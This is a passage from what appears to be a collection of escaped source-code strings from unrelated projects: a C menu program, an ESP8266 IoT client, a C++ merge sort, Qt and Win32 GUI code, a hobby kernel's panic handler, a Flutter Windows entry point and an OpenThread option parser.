select;\r\n\t\t\t\t\tprintf(\"Types of staff: \\n\");\r\n\t\t\t\t\tprintf(\"1.Teaching Faculty\\n\");\r\n\t\t\t\t\tprintf(\"2.Non Teaching Faculty\\n\");\r\n\t\t\t\t\tprintf(\"Select the type of staff:\\n\");\r\n\t\t\t\t\tscanf(\"%d\",&select);\r\n\t\t\t\t\t\tif(select==1)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tprint_teaching();\r\n\t\t\t\t\t\t\tprintf(\"Thank you for visiting facultys portal\\n\");\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse if(select==2)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tprint_non_teaching();\r\n\t\t\t\t\t\t\tprintf(\"Thank you for visiting facultys portal\\n\");\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tprintf(\"Invalid Choice\\n\");\r\n\t\t\t\t\t\t\tprintf(\"Thank you for visiting facultys portal\\n\");\r\n\t\t\t\t\t\t\tprintf(\"------------------------Thank you---------------------------- \\n\");\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tbreak;\t\r\n\t\t\tcase 3:\r\n\t\t\t\tprintf(\"-------------------------------WELCOME TO SPORTS BLOCK-------------------------\\n\");\r\n\t\t\t\tprintf(\"Types of sport:\\n\");\r\n\t\t\t\tprintf(\"1. Outdoor sports\\n\");\r\n\t\t\t\tprintf(\"2. Indoor sports\\n\");\r\n\t\t\t\tprintf(\"Select the type of sport:\\n\");\r\n\t\t\t\tscanf(\"%d\",&sport);\r\n\t\t\t\t\tif(sport==1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_outdoor();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting sports portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if(sport==2)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprint_indoor();\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting sports portal\\n\");\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tprintf(\"Invalid Choice\\n\");\r\n\t\t\t\t\t\tprintf(\"Thank you for visiting sports portal\\n\");\r\n\t\t\t\t\t\tprintf(\"------------------------Thank you-----------",
    "/*\r\n######################################################################\r\n##      Integra\u00e7\u00e3o das tecnologias da REMOTE IO com Node IOT        ##\r\n##                          Version 1.0                             ##\r\n##   C\u00f3digo base para implementa\u00e7\u00e3o de projetos de digitaliza\u00e7\u00e3o de ##\r\n##   processos, automa\u00e7\u00e3o, coleta de dados e envio de comandos com  ##\r\n##   controle embarcado e na nuvem.                                 ##\r\n##                                                                  ##\r\n######################################################################\r\n*/\r\n\r\n#include \"ESP8266RemoteIO.h\";\r\n#include \"index_html.h\";\r\n\r\ntypedef struct interrupt_data \r\n{\r\n  RemoteIO* remoteio_pointer;\r\n  String ref_arg;\r\n} interrupt_data;\r\n\r\nDynamicJsonDocument post_data_queue(1024);\r\nunsigned long last_queue_sent_time = 0;\r\n\r\nRemoteIO::RemoteIO()\r\n{\r\n  _appPort = 5000;\r\n\r\n  server = new AsyncWebServer(80);\r\n\r\n  anchor_route = \"http://anchor_IP/post-message\";\r\n  anchored_route = \"http://anchored_IP/post-message\";\r\n\r\n  state = \"\";\r\n  token = \"\";\r\n    \r\n  configurations = configurationDocument.to<JsonArray>();\r\n  setIO = configurations.createNestedObject();\r\n\r\n  Connected = false;\r\n  Socketed = 0;\r\n  messageTimestamp = 0;\r\n\r\n  connection_state = INICIALIZATION;\r\n  next_state = INICIALIZATION;\r\n\r\n  start_debounce_time = 0;\r\n  start_browsing_time = 0;\r\n  start_reconnect_time = 0;\r\n  start_reset_time = 0;\r\n\r\n  lastIP_index = -1;\r\n  anchored = false;\r\n  anchoring = false;\r\n  reconnect_counter = 0;\r\n}\r\n\r\nvoid RemoteIO::begin()\r\n{\r\n  Serial.begin(115200);\r\n\r\n  if (!SPIFFS.begin()) \r\n  {\r\n    //Serial.println(\"Erro ao montar o sistema de arquivos\");\r\n    ESP.restart();\r\n  }\r\n\r\n  StaticJsonDocument<JSON_DOCUMENT_CAPACITY> nvsDoc;\r\n  bool hasConfig = true;\r\n\r\n  File file = SPIFFS.open(\"/config.json\", \"r\");\r\n\r\n  if (!file) \r\n  {\r\n    //Serial.println(\"\\nn\u00e3o achei o config.json\");\r\n    hasConfig = false;\r\n  }\r\n  else \r\n  {\r\n    //Serial.println(\"\\nachei o config.json\");\r\n    deserializeJson(nvsDoc, file);\r\n  }\r\n  \r\n  file.close();\r\n\r\n  String NVS_SSID = nvsDoc[\"ssid\"].as<String>();\r\n  String NVS_PASSWORD = nvsDoc[\"password\"].as<String>();\r\n  String NVS_COMPANYNAME = nvsDoc[\"companyName\"].as<String>();\r\n  String NVS_DEVICEID = nvsDoc[\"deviceId\"].as<String>();\r\n  String NVS_MODEL = nvsDoc[\"model\"].as<String>();\r\n  String NVS_IOSETTINGS = nvsDoc[\"ioSettings\"].as<String>();\r\n  bool NVS_SSIDAUTH = nvsDoc[\"ssidAuth\"].as<bool>();\r\n\r\n  if (!hasConfig)\r\n  {\r\n    startAccessPoint();\r\n  }\r\n  else\r\n  {\r\n    _ssid = NVS_SSID;\r\n    _password = NVS_PASSWORD;\r\n    _companyName = NVS_COMPANYNAME;\r\n    _deviceId = NVS_DEVICEID;\r\n    _model = NVS_MODEL;\r\n    ssidAuth = NVS_SSIDAUTH;\r\n\r\n    appBaseUrl = \"https://api.nodeiot.app.br/api\";\r\n    appVerifyUrl = appBaseUrl + \"/devices/verify\";\r\n    appPostData = appBaseUrl + \"/broker/data/\";\r\n    appSideDoor = appBaseUrl + \"/devices/devicedisconnected\";\r\n    appPostDataFromAnchored = appBaseUrl + \"/broker/ahamdata\";\r\n    appLastDataUrl = appBaseUrl + \"/devices/getdata/\" + _companyName + \"/\" + _deviceId;\r\n\r\n    nodeIotConnection();\r\n\r\n    String LOCAL_DOMAIN = String(\"niot-\") + String(_deviceId);\r\n\r\n    if (!MDNS.begin(LOCAL_DOMAIN)) \r\n    {\r\n      //Serial.println(\"Erro ao configurar o mDNS\");\r\n    }\r\n\r\n    AsyncCallbackJsonWebHandler* handler = new AsyncCallbackJsonWebHandler(\"/post-message\", [this](AsyncWebServerRequest *request, JsonVariant &json) {\r\n      StaticJsonDocument<250> data;\r\n      String response;\r\n      if (json.is<JsonArray>())\r\n      {\r\n        data = json.as<JsonArray>();\r\n      }\r\n      else if (json.is<JsonObject>())\r\n      {\r\n        data = json.as<JsonObject>();\r\n      }\r\n      \r\n      //Serial.print(\"[AsyncCallback]: \");\r\n      //Serial.println(data.as<String>());\r\n\r\n      \r\n      if (data.containsKey(\"status\"))\r\n      {\r\n        if (connection_state == CONNECTED)\r\n        {\r\n          data.remove(\"status\");\r\n          data[\"ipAddress\"] = request->client()->remoteIP().toString();\r\n\r\n          serializeJson(data, send_to_niot_buffer);\r\n\r\n          if (espPOST(appSideDoor, \"\", send_to_niot_buffer) == HTTP_CODE_OK)\r\n          {\r\n            send_to_niot_buffer.clear();\r\n            data.clear();\r\n            \r\n            if (anchoring) \r\n            {\r\n              data[\"msg\"] = \"ok\";\r\n              anchoring = false;\r\n            }\r\n            else data[\"msg\"] = \"received\";\r\n\r\n            serializeJson(data, response);\r\n            request->send(200, \"application/json\", response);\r\n          }\r\n          else \r\n          {\r\n            send_to_niot_buffer.clear();\r\n            data.clear();\r\n            data[\"msg\"] = \"post to niot failed\";\r\n            serializeJson(data, response);\r\n            request->send(500, \"application/json\", response);\r\n          }\r\n        }\r\n        else \r\n        {\r\n          if (request->client()->remoteIP().toString() == anchor_IP) \r\n          {\r\n            anchor_IP.clear();\r\n            anchored = false;\r\n          }\r\n\r\n          data.cle",
    "#include <iostream>\n\nclass MergeSort {\npublic:\n    int arraySize; // Number of elements in the array\n    int array[10]; // Array to store elements (size limited to 10)\n    void getArray(); // Method to get array elements from the user\n    void mergeSort(int[], int, int); // Method to perform merge sort\n    void merge(int[], int, int, int); // Method to merge sorted subarrays\n    void display(); // Method to display the sorted array\n};\n\n// Method to get array elements from the user\nvoid MergeSort::getArray() {\n    std::cout << \"\\nEnter the number of elements: \";\n    std::cin >> arraySize; // Read the number of elements\n    if (arraySize > 10) {\n        std::cerr << \"Error: Number of elements exceeds array size limit.\" << std::endl;\n        arraySize = 10; // Limit the number of elements to the array size\n    }\n    std::cout << \"\\nEnter the array elements to sort: \";\n    for (int i = 0; i < arraySize; i++) {\n        std::cin >> array[i]; // Read each element into the array\n    }\n}\n\n// Method to perform merge sort on the array\nvoid MergeSort::mergeSort(int arr[], int low, int high) {\n    if (low < high) {\n        int mid = (low + high) / 2; // Find the middle point\n        mergeSort(arr, low, mid); // Recursively sort the first half\n        mergeSort(arr, mid + 1, high); // Recursively sort the second half\n        merge(arr, low, mid, high); // Merge the sorted halves\n    }\n}\n\n// Method to merge two sorted subarrays into a single sorted subarray\nvoid MergeSort::merge(int arr[], int low, int mid, int high) {\n    int leftIndex = low; // Starting index of the left subarray\n    int rightIndex = mid + 1; // Starting index of the right subarray\n    int mergedIndex = low; // Starting index for the merged array\n    int tempArray[10]; // Temporary array to store merged results\n\n    // Merge elements from both subarrays\n    while (leftIndex <= mid && rightIndex <= high) {\n        if (arr[leftIndex] <= arr[rightIndex]) {\n            tempArray[mergedIndex++] = arr[leftIndex++]; // Add smaller element to tempArray\n        } else {\n            tempArray[mergedIndex++] = arr[rightIndex++]; // Add smaller element to tempArray\n        }\n    }\n\n    // Copy any remaining elements from the left subarray\n    while (leftIndex <= mid) {\n        tempArray[mergedIndex++] = arr[leftIndex++];\n    }\n\n    // Copy any remaining elements from the right subarray\n    while (rightIndex <= high) {\n        tempArray[mergedIndex++] = arr[rightIndex++];\n    }\n\n    // Copy the merged elements back to the original array\n    for (int i = low; i <= high; i++) {\n        arr[i] = tempArray[i];\n    }\n}\n\n// Method to display the sorted array\nvoid MergeSort::display() {\n    std::cout << \"\\nThe sorted elements: \";\n    for (int i = 0; i < arraySize; i++) {\n        std::cout << array[i] << \" \"; // Print each element of the sorted array\n    }\n    std::cout << std::endl;\n}\n\nint main() {\n    MergeSort sorter; // Create an instance of MergeSort\n    sorter.getArray(); // Get the array elements from the user\n    sorter.mergeSort(sorter.array, 0, sorter.arraySize - 1); // Perform merge sort\n    sorter.display(); // Display the sorted array\n    return 0;\n}\n",
    "#include <QGridLayout>\n#include <QLabel>\n#include <QListWidget>\n#include <QPainter>\n#include <QPushButton>\n#include <QTabWidget>\n#include <QWidget>\n\n#include <QLabel>\n#include <qboxlayout.h>\n#include <qcoreevent.h>\n#include <qgridlayout.h>\n#include <qnamespace.h>\n#include <qpushbutton.h>\n\n#include \"../mainWindow.hpp\"\n#include \"../utils/resizeFilter.hpp\"\n#include \"../utils/styleManager.hpp\"\n#include \"../widgets/todoWidget.hpp\"\n#include \"centralWidget.hpp\"\n#include \"projectWidget.hpp\"\n\nCentralWidget::CentralWidget(QWidget *parent, QStringList *palette)\n    : QWidget(parent) {\n  QStringList *paletteList = StyleManager::getPalette();\n\n  tabWidget = new QTabWidget(this);\n  tabWidget->setElideMode(Qt::ElideRight);\n  tabWidget->installEventFilter(new ResizeFilter(tabWidget));\n  tabWidget->setTabsClosable(true);\n  /*tabWidget->tabBar()->setTabButton(index, QTabBar::RightSide,\n   * closeTabButton);*/\n  /*int index = tabWidget->indexOf(todoWidget);*/\n  /*QPushButton *closeTabButton =*/\n  /*    new QPushButton(StyleManager::changeIconColor(*/\n  /*                        \"../src/assets/icons/material-symbols--close.svg\",\n   * 24,*/\n  /*                        24, paletteList->at(10)),*/\n  /*                    \"\");*/\n  /*closeTabButton->setStyleSheet(\"border: none; background-color: #CCD0DA;\");*/\n  TodoWidget *todoWidget = new TodoWidget(tabWidget);\n  tabWidget->addTab(todoWidget, \"Todo List\");\n\n  QWidget *windowButton = new QWidget(tabWidget);\n  QPushButton *minimizeButton = new QPushButton(\n      StyleManager::changeIconColor(\n          \"../src/assets/icons/material-symbols--horizontal-rule-rounded.svg\",\n          20, 20, paletteList->at(10)),\n      \"\", windowButton);\n  minimizeButton->setIconSize(QSize(20, 20));\n  QPushButton *maximizeButton = new QPushButton(\n      StyleManager::changeIconColor(\n          \"../src/assets/icons/material-symbols--square-outline-rounded.svg\",\n          20, 20, paletteList->at(10)),\n      \"\", windowButton);\n  maximizeButton->setIconSize(QSize(20, 20));\n  QPushButton *closeButton =\n      new QPushButton(StyleManager::changeIconColor(\n                          \"../src/assets/icons/material-symbols--close.svg\", 20,\n                          20, paletteList->at(10)),\n                      \"\", windowButton);\n  closeButton->setIconSize(QSize(20, 20));\n  QHBoxLayout *buttonLayout = new QHBoxLayout(windowButton);\n  buttonLayout->addWidget(minimizeButton);\n  buttonLayout->addWidget(maximizeButton);\n  buttonLayout->addWidget(closeButton);\n  windowButton->setObjectName(\"windowButtons\");\n  windowButton->setLayout(buttonLayout);\n\n  tabWidget->setCornerWidget(windowButton);\n\n  QGridLayout *centralLayout = new QGridLayout(this);\n  centralLayout->setContentsMargins(0, 0, 0, 0);\n  centralLayout->setSpacing(0);\n  centralLayout->addWidget(tabWidget, 1, 0);\n  setLayout(centralLayout);\n  setObjectName(\"centralWidget\");\n\n  connect(minimizeButton, &QPushButton::clicked, this,\n          [this]() { parentWidget()->showMinimized(); });\n  connect(maximizeButton, &QPushButton::clicked, this,\n          [this]() { parentWidget()->showMaximized(); });\n  connect(closeButton, &QPushButton::clicked, this,\n          [this]() { parentWidget()->close(); });\n\n  connect(todoWidget, &TodoWidget::addProjectTask, this,\n          &CentralWidget::handleAddProjectTask);\n  connect(tabWidget, &QTabWidget::tabCloseRequested, this,\n          &CentralWidget::handleDeleteTab);\n}\n\nvoid CentralWidget::handleDeleteTab(int index) {\n  delete tabWidget->widget(index);\n}\nvoid CentralWidget::handleAddProjectTask(int taskId) {\n  ProjectWidget *projectWidget = new ProjectWidget(taskId, tabWidget);\n  tabWidget->addTab(projectWidget, \"Project List\");\n  tabWidget->setCurrentWidget(projectWidget);\n  connect(projectWidget, &ProjectWidget::addProjectTask, this,\n          &CentralWidget::handleAddProjectTask);\n}\n\nvoid CentralWidget::paintEvent(QPaintEvent *pe) {\n  QStyleOption o;\n  o.initFrom(this);\n  QPainter p(this);\n  style()->drawPrimitive(QStyle::PE_Widget, &o, &p, this);\n};\n",
    "#include \"Window.h\"\n\n// Construtor\nWindow::Window()\n{\n    windowId = 0;                                       // id nulo porque a janela ainda n\u00e3o existe\n    windowWidth = GetSystemMetrics(SM_CXSCREEN);        // a janela ocupa toda a tela (tela cheia)\n    windowHeight = GetSystemMetrics(SM_CYSCREEN);       // a janela ocupa toda a tela (tela cheia)\n    windowIcon = LoadIcon(NULL, IDI_APPLICATION);       // \u00edcone padr\u00e3o de uma aplica\u00e7\u00e3o\n    windowCursor = LoadCursor(NULL, IDC_ARROW);         // cursor padr\u00e3o de uma aplica\u00e7\u00e3o\n    windowColor = RGB(0, 0, 0);                         // cor de fundo padr\u00e3o \u00e9 preta\n    windowTitle = string(\"Windows App\");                // t\u00edtulo padr\u00e3o da janela\n    windowStyle = WS_POPUP | WS_VISIBLE;                // estilo para tela cheia\n    windowMode = FULLSCREEN;                            // modo padr\u00e3o \u00e9 tela cheia\n    windowPosX = 0;                                     // posi\u00e7\u00e3o inicial da janela no eixo x\n    windowPosY = 0;                                     // posi\u00e7\u00e3o inicial da janela no eixo y\n    windowCenterX = windowWidth / 2;                    // centro da janela no eixo x\n    windowCenterY = windowHeight / 2;                   // centro da janela no eixo y\n}\n\nvoid Window::Mode(int mode)\n{\n    windowMode = mode;\n\n    if (mode == WINDOWED)\n    {\n        // modo em janela\n        windowStyle = WS_OVERLAPPED | WS_SYSMENU | WS_VISIBLE;\n    }\n    else\n    {\n        // modo em tela cheia ou sem bordas\n        windowStyle = WS_EX_TOPMOST | WS_POPUP | WS_VISIBLE;\n    }\n}\n\nvoid Window::Size(int width, int height)\n{\n    // window size\n    windowWidth = width;\n    windowHeight = height;\n\n    // calcula a posi\u00e7\u00e3o do centro da janela\n    windowCenterX = windowWidth / 2;\n    windowCenterY = windowHeight / 2;\n\n    // ajusta a posi\u00e7\u00e3o da janela para o centro da tela\n    windowPosX = (GetSystemMetrics(SM_CXSCREEN) / 2) - (windowWidth / 2);\n    windowPosY = (GetSystemMetrics(SM_CYSCREEN) / 2) - (windowHeight / 2);\n}\n\nvoid Window::Print(string text, int x, int y, COLORREF color)\n{\n    // esta fun\u00e7\u00e3o exibe o texto na posi\u00e7\u00e3o (x,y) da tela usando a cor especificada\n    // ela usa a GDI do Windows (lenta) e deve ser usada apenas para depura\u00e7\u00e3o\n\n    // pega o contexto do dispositivo gr\u00e1fico\n    HDC xdc = GetDC(windowId);\n\n    // define a cor do texto\n    SetTextColor(xdc, color);\n\n    // define o fundo do texto como transparente\n    SetBkMode(xdc, TRANSPARENT);\n\n    // mostra o texto\n    TextOut(xdc, x, y, text.c_str(), (int)text.size());\n\n    // libera o contexto do dispositivo\n    ReleaseDC(windowId, xdc);\n}\n\nbool Window::Create()\n{\n    // identificador da aplica\u00e7\u00e3o\n    HINSTANCE appId = GetModuleHandle(NULL);\n\n    // definindo uma classe de janela\n    WNDCLASSEX wndClass;\n    wndClass.cbSize = sizeof(WNDCLASSEX);\n    wndClass.style = CS_DBLCLKS | CS_OWNDC | CS_HREDRAW | CS_VREDRAW;\n    wndClass.lpfnWndProc = Window::WinProc;\n    wndClass.cbClsExtra = 0;\n    wndClass.cbWndExtra = 0;\n    wndClass.hInstance = appId;\n    wndClass.hIcon = windowIcon;\n    wndClass.hCursor = windowCursor;\n    wndClass.hbrBackground = (HBRUSH)CreateSolidBrush(windowColor);\n    wndClass.lpszMenuName = NULL;\n    wndClass.lpszClassName = \"AppWindow\";\n    wndClass.hIconSm = windowIcon;\n\n    // registrando classe \"AppWindow\"\n    if (!RegisterClassEx(&wndClass))\n        return false;\n\n    // criando uma janela baseada na classe \"AppWindow\" \n    windowId = CreateWindowEx(\n        NULL,                           // estilos extras\n        \"AppWindow\",                    // nome da classe da janela\n        windowTitle.c_str(),            // t\u00edtulo da janela\n        windowStyle,                    // estilo da janela\n        windowPosX, windowPosY,         // posi\u00e7\u00e3o (x,y) inicial\n        windowWidth, windowHeight,      // largura e altura da janela\n        NULL,                           // identificador da janela pai\n        NULL,                           // identificador do menu\n        appId,                          // identificador da aplica\u00e7\u00e3o\n        NULL);                          // par\u00e2metros de cria\u00e7\u00e3o\n\n    // Ao usar o modo em janela \u00e9 preciso levar em conta que as barras \n    // e bordas ocupam espa\u00e7o na janela. O c\u00f3digo abaixo ajusta o tamanho\n    // da janela de forma que a \u00e1rea cliente fique com tamanho \n    // (windowWidth x windowHeight)\n\n    if (windowMode == WINDOWED)\n    {\n        // ret\u00e2ngulo com o tamanho da \u00e1rea cliente desejada\n        RECT winRect = { 0, 0, windowWidth, windowHeight };\n\n        // ajusta o tamanho do ret\u00e2ngulo\n        AdjustWindowRectEx(&winRect,\n                           GetWindowStyle(windowId),\n                           GetMenu(windowId) != NULL,\n                           GetWindowExStyle(windowId));\n\n        // atualiza posi\u00e7\u00e3o da janela\n        windowPosX = (GetSystemMetrics(SM_CXSCREEN) / 2) - ((winRect.right - winRect.left) / 2);\n        windowPosY = (GetSystemMetrics(SM_CYSCREEN) / 2) - ((winRect.bottom - winRect.top) / 2);\n\n        // redimensiona janela",
    "/*\nSphynx Operating System\n\nFile: cpu.cpp\nAuthor: Kevin Alavik\nYear: 2024\n\nLicense: MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\nDescription: Common CPU functions and utilities\n*/\n\n#include <sys/cpu.hpp>\n#include <dev/tty.hpp>\n#include <string.hpp>\n\nvoid _kpanic_handler(IDT::int_frame_t *frame, const char* file, int line, const char* reason) {\n    #if SPHYNX_SIMPLE_PANIC\n    KMPRINTF(\"\\033[31mKernel Panic @ CPU %s (0x%.16llx), Reason: \\\"%s\\\", %s:%d\\n\", \"???\", (frame == nullptr) ? 0x0 : frame->rip, reason, file, line);\n    #else\n    KMPRINTF(\"\\n\\033[31mKernel panic - cpu %s: %s\\033[0m\\n\", \"???\", reason);\n    KMPRINTF(\"\\033[31mIn file: %s, line: %d\\033[0m\\n\", file, line);\n\n    #if SPHYNX_VERBOSE_IDT\n    if (frame != nullptr) {\n        DPRINTF(\"\\033[31mRegister dump:\\033[0m\\n\");\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"CR2\", frame->cr2);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"CR3\", frame->cr3);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RAX\", frame->rax);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RBX\", frame->rbx);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RCX\", frame->rcx);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RDX\", frame->rdx);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RSI\", frame->rsi);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RDI\", frame->rdi);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RBP\", frame->rbp);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R8 \", frame->r8);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R9 \", frame->r9);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R10\", frame->r10);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R11\", frame->r11);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R12\", frame->r12);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R13\", frame->r13);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R14\", frame->r14);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"R15\", frame->r15);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RIP\", frame->rip);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"CS \", frame->cs);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RFLAGS\", frame->rflags);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RSP\", frame->rsp);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"SS \", frame->ss);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"DS \", frame->ds);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"ERR\", frame->err);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"VECTOR\", frame->vector);\n    }\n    #else\n    #if SPHYNX_DUMP_REG_ON_INT\n    if (frame != nullptr) {\n        DPRINTF(\"\\033[31mBasic register dump:\\033[0m\\n\");\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RIP\", frame->rip);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RSP\", frame->rsp);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"RFLAGS\", frame->rflags);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"CS \", frame->cs);\n        DPRINTF(\"\\033[31m  %-12s: 0x%016llx\\033[0m\\n\", \"SS \", frame->ss);\n    }\n    #endif\n    #endif\n\n    if (frame != nullptr && frame->vector == 14) {\n        DPRINTF(\"\\033[31mPage Fault Details:\\033[0m\\n\");\n        DPRINTF(\"\\033[31m  Operation: %s\\033[0m\\n\", (frame->err & 0x1) ? \"Protection Violation\" : \"Non-Present Page\");\n        DPRINTF(\"\\033[31m  Access Type: %s\\033[0m\\n\", (frame->err & 0x2) ? \"Write\" : \"Read\");\n        DPRINTF(\"\\033[31m  Privilege Level: %s\\033[0m\\n\", (frame->err & 0x4) ? \"User Mode\" : \"Supervisor Mode\");\n        if (frame->err & 0x8) DPRINTF(\"\\033[31m  Reserved Write: Yes\\033[0m\\n\");\n        if (frame->err & 0x10) DPRINTF(\"\\033[31m  Instruction Fetch: Yes\\033[0m\\n\");\n    }\n\n    KMPRINTF(\"\\033[31mStack trace:\\033[0m\\n\");\n    KMPRINTF(\"\\033[31m  (TODO: Implement stack trace)\\033[0m\\n\");\n\n    #endif\n\n    hcf();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fatortak\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <algorithm>\n#include <setjmp.h>\n#include <new>\n#include <getopt.h>\n#include \"code_utils.hpp\"\n#include \"application.hpp\"\n\nstatic constexpr char kAutoAttachDisableArg[] = \"--auto-attach=0\";\nstatic char           sAutoAttachDisableArgStorage[sizeof(kAutoAttachDisableArg)];\nstatic jmp_buf sResetJump;\nstatic const char* kDefaultInterfaceName = \"wpan0\";\nenum\n{\n    OTBR_OPT_BACKBONE_INTERFACE_NAME = 'B',\n    OTBR_OPT_DEBUG_LEVEL             = 'd',\n    OTBR_OPT_HELP                    = 'h',\n    OTBR_OPT_INTERFACE_NAME          = 'I',\n    OTBR_OPT_VERBOSE                 = 'v',\n    OTBR_OPT_SYSLOG_DISABLE          = 's',\n    OTBR_OPT_VERSION                 = 'V',\n    OTBR_OPT_SHORTMAX                = 128,\n    OTBR_OPT_RADIO_VERSION,\n    OTBR_OPT_AUTO_ATTACH,\n    OTBR_OPT_REST_LISTEN_ADDR,\n    OTBR_OPT_REST_LISTEN_PORT,\n};\n\nstatic const struct option kOptions[] = {\n    {\"backbone-ifname\", required_argument, nullptr, OTBR_OPT_BACKBONE_INTERFACE_NAME},\n    {\"debug-level\", required_argument, nullptr, OTBR_OPT_DEBUG_LEVEL},\n    {\"help\", no_argument, nullptr, OTBR_OPT_HELP},\n    {\"thread-ifname\", required_argument, nullptr, OTBR_OPT_INTERFACE_NAME},\n    {\"verbose\", no_argument, nullptr, OTBR_OPT_VERBOSE},\n    {\"syslog-disable\", no_argument, nullptr, OTBR_OPT_SYSLOG_DISABLE},\n    {\"version\", no_argument, nullptr, OTBR_OPT_VERSION},\n    {\"radio-version\", no_argument, nullptr, OTBR_OPT_RADIO_VERSION},\n    {\"auto-attach\", optional_argument, nullptr, OTBR_OPT_AUTO_ATTACH},\n    {\"rest-listen-address\", required_argument, nullptr, OTBR_OPT_REST_LISTEN_ADDR},\n    {\"rest-listen-port\", required_argument, nullptr, OTBR_OPT_REST_LISTEN_PORT},\n    {0, 0, 0, 0}\n};\n\nstd::vector<char *> AppendAutoAttachDisableArg(int argc, char *argv[])\n{\n\tstd::vector<char *> args(argv, argv + argc);\n\tstd::vector<char *>::iterator new_end;\n\n\t// std::remove_if returns a new end of 